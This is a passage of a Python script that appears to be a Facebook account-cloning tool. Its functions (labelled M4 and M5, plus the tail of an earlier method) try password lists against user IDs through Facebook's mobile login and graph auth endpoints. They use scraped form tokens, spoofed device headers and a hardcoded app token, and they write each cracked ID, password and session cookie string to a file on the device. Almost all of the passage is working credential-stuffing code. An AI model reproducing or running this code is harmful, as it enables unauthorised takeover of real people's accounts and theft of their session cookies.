                        headers = {'User-Agent':pro(),'Accept-Encoding':'gzip, deflate','Connection':'close','Content-Type':'application/x-www-form-urlencoded','Host':'graph.facebook.com','X-FB-Net-HNI':str(random.randint(2e4, 4e4)),'X-FB-SIM-HNI':str(random.randint(2e4, 4e4)),'Authorization':'OAuth 350685531728|62f8ce9f74b12f84c123cc23437a4a32','X-FB-Connection-Type':'WIFI','X-Tigon-Is-Retry':'False','x-fb-session-id':'nid=jiZ+yNNBgbwC;pid=Main;tid=132;nc=1;fc=0;bc=0;cid=62f8ce9f74b12f84c123cc23437a4a32','x-fb-device-group':'5120','X-FB-Friendly-Name':'ViewerReactionsMutation','X-FB-Request-Analytics-Tags':'graphservice','X-FB-HTTP-Engine':'Liger','X-FB-Client-IP':'True','X-FB-Server-Cluster':'True','x-fb-connection-token':'62f8ce9f74b12f84c123cc23437a4a32'}
                        url = 'https://b-graph.facebook.com/auth/login'
                        po = requests.post(url,data=data,headers=headers).json()
                        if 'session_key' in po:
                                uid = po['uid']
                                coki = ';'.join(i['name']+'='+i['value'] for i in po['session_cookies'])
                                print(f'\r\r\x1b[38;5;46m|L s X_OK| {str(uid)} | {pas} ')
                                open('/sdcard/CLONING/LsX-RNDM-OK.txt','a').write(str(uid)+'|'+pas+'|'+coki+'\n')
                                oks.append(str(uid))
                                break
                        else:continue
                loop+=1
        except:pass
#──────────────{ RANDOM-METHOD-M4 }──────────────#
def __Randm_M4__(ids,passlist):
    global oks,cps,loop
    try:
        for pas in passlist:
            session=requests.Session()
            sys.stdout.write(f'\r\r{C}|ASIF-M4| {loop} {len(oks)}{G}|{A}{len(cps)} ');sys.stdout.flush()
            pro = random.choice(ugen)
            free_fb = session.get('https://m.facebook.com').text
            log_data = {
                "lsd":re.search('name="lsd" value="(.*?)"', str(free_fb)).group(1),
            "jazoest":re.search('name="jazoest" value="(.*?)"', str(free_fb)).group(1),
            "m_ts":re.search('name="m_ts" value="(.*?)"', str(free_fb)).group(1),
            "li":re.search('name="li" value="(.*?)"', str(free_fb)).group(1),
            "try_number":"0",
            "unrecognized_tries":"0",
            "email":ids,
            "pass":pas,
            "login":"Log In"}
            pron_star={'authority': 'd.facebook.com','method':'GET','scheme':'https','accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7','accept-language': 'en-US,en;q=0.9','cache-control': 'max-age=0','dpr': '2','sec-ch-prefers-color-scheme': 'light','sec-ch-ua': '"Not)A;Brand";v="24", "Chromium";v="116"','sec-ch-ua-full-version-list': '"Not)A;Brand";v="24.0.0.0", "Chromium";v="116.0.5845.72"','sec-ch-ua-mobile': '?1','sec-ch-ua-model': '"Infinix X6515"','sec-ch-ua-platform': '"Android"','sec-ch-ua-platform-version': '"12.0.0"','sec-fetch-dest': 'document','sec-fetch-mode': 'navigate','sec-fetch-site': 'none','sec-fetch-user': '?1','upgrade-insecure-requests': '1','user-agent': pro,'viewport-width': '980',}
            lo = session.post('https://mbasic.facebook.com/login/device-based/regular/login/?refsrc',data=log_data,headers=pron_star).text
            log_cookies=session.cookies.get_dict().keys()
            if 'c_user' in log_cookies:
                coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                ids = re.findall('c_user=(.*);xs', coki)[0]
                print(f'\r\r\x1b[38;5;46m|L s X_OK| {ids} | {pas} ')
                open('/sdcard/CLONING/LsX-RNDM-OK.txt','a').write(str(ids)+'|'+pas+'|'+coki+'\n')
                oks.append(ids)
                break
            else:
                continue
        loop+=1
    except:
        pass
#──────────────{ RANDOM-METHOD-M5 }──────────────#
def __Randm_M5__(ids,passlist):
    global oks,cps,loop
    try:
        for pas in passlist:
            session=requests.Session()
            sys.stdout.write(f'\r\r{C}|ASIF-M5| {loop} {len(oks)}{G}|{A}{len(cps)} ');sys.stdout.flush()
            pro = random.choice(ugen)
            free_fb = session.get('https://mbasic.facebook.com').text
            log_data = {
                "lsd":re.search('name="lsd" value="(.*?)"', str(free_fb)).group(1),
            "jazoest":re.search('name="jazoest" value="(.*?)"', str(free_fb)).group(1),
            "m_ts":re.search('name="m_ts" value="(.*?)"', str(free_fb)).group(1),
            "li":re.search('name="li" value="(.*?)"', str(free_fb)).group(1),
            "try_number":"0",
            "unrecognized_tries":"0",
            "email":ids,
            "pass":pas,
            "login":"Log In"}
            pron_star={'authority': 'x.facebook.com','method':'GET','scheme':'https','accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7','accept-language': 'en-US,en;q=0.9','cache-control': 'max-age=0','dpr': '2','sec-ch-prefers-color-scheme': 'light','sec-ch-ua': '"Not)A;Brand";v="24", "Chromium";v="116"','sec-ch-ua-full-version-list': '"Not)A;Brand";v="24.0.0.0", "Chromium";v="116.0.5845.72"','sec-ch-ua-mobile': '?1','sec-ch-ua-model': '"Infinix X6515"','sec-ch-ua-platform': '"Android"','sec-ch-ua-platform-version': '"12.0.0"','sec-fetch-dest': 'document','sec-fetch-mode': 'navigate','sec-fetch-site': 'none','sec-fetch-user': '?1','upgrade-insecure-requests': '1','user-agent': pro,'viewport-width': '980',}
            lo = session.post('https://mbasic.facebook.com/login/device-based/regular/login/?refsrc',data=log_data,headers=pron_star).text
            log_cookies=session.cookies.get_dict().keys()
            if 'c_user' in log_cookies:
                coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                ids = re.findall('c_user=(.*);xs', coki)[0]
                print(f'\r\r\x1b[38;5;46m|L s X_OK| {ids} | {pas} ')
                open('/sdcard/CLONING/LsX-RNDM-OK.txt','a').write(str(ids)+'|'+pas+'|'+coki+'\n')
                oks.append(ids)
                break
            else:
                continue
        loop+=1
    except:
        pass
#──────────────{ END }──────────────#
menu()
